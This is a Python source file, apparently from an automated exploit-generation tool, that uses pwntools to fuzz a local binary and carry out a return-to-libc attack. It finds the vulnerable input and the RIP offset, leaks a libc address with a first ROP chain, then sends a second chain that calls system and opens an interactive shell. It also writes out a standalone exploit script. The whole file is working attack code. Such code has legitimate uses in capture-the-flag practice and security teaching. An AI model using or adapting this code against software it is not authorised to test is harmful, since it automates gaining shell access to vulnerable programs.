from pwn import *
import time
import subprocess
import sys
import re
from verify_exploit import *
from parser import *
from utils import *
from dynamic_analyser import *


libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6',checksec=True)



def ret2libc_attack(parameters):
    """
    Function to perform a return-to-libc attack with libc leak.

    Arguments:
        parameters: Data parameters parsed.

    Returns:
        Spawns the shell if the attack is succesful, and generates the corresponding Python script.
    """

    
    binary_file = parameters[0]     
    verbose = parameters[1]
    delimiter= f'{parameters[2]}'  
    binary = ELF(f"{binary_file}")
    fuzzer = parameters[4]


    vprint("\nFuzzing the program... ", verbose)
    n, input = get_vulneble_funct(f"{binary_file}", fuzzer, delimiter)
    vprint(f"Found vulnerable function: {n}", verbose)
    vprint("\nFinding the offset...", verbose)

    rip_offset, remaining_lines = get_offset(n, input, binary_file, delimiter)
    vprint(f"\nRip offset: {rip_offset}", verbose)

    context.binary = binary = ELF(f"{binary_file}")
    vprint("\nBuilding the first rop chain...", verbose)


    rop_chain1=build_first_rop_chain(rip_offset, binary)
    rop=ROP(binary)
    p = process()

    print("\nVulnerable question: ", n)

    
    for i in range(n):      
        o1=p.recvuntil(delimiter)            
        p.sendline(str(input))   
    o3=p.recvuntil(delimiter)
    vprint("\nVulnerable question: ", o3)

    pause()
    p.sendline(rop_chain1)


    vprint("\nRemaining questions before leak: ", remaining_lines)
    if remaining_lines > 0: 
        for i in range(remaining_lines): 
            p.recvuntil(delimiter)
            p.sendline(str(input))

    out=p.recvuntil(delimiter) 
    leak =  getLeak(out).rstrip().ljust(8,b'\x00')
    
    vprint(f"\nLibc leak: {leak}", verbose)

    #Calculates the libc base address
    libc.address= get_base_address(libc, leak, "printf")
    vprint(f"\nBase address of LIBC: {hex(libc.address)}", verbose)

    #Invokes the system function from the libc using a ROP chain
    vprint("\nBuilding the second rop chain...", verbose)
    rop_chain_2=build_second_rop_chain(rip_offset, binary, libc)

    vprint("\nRemaining questions before leak", remaining_lines)

    
    p.sendline(str(input))  
    for i in range(n-1):    
        o1=p.recvuntil(delimiter)
        p.sendline(str(input))
    o1=p.recvuntil(delimiter)  
    pause()
    p.sendline(rop_chain_2)

    for i in range(remaining_lines):
        o1=p.recvuntil(delimiter)
        p.sendline(str(input))
          
    generate_exploit_ret2libc(n, rip_offset, binary_file, input)
    vprint("\nHere is the shell:", verbose)
    p.interactive()



    if __name__ == "__main__":
        ret2libc_attack(parameters)
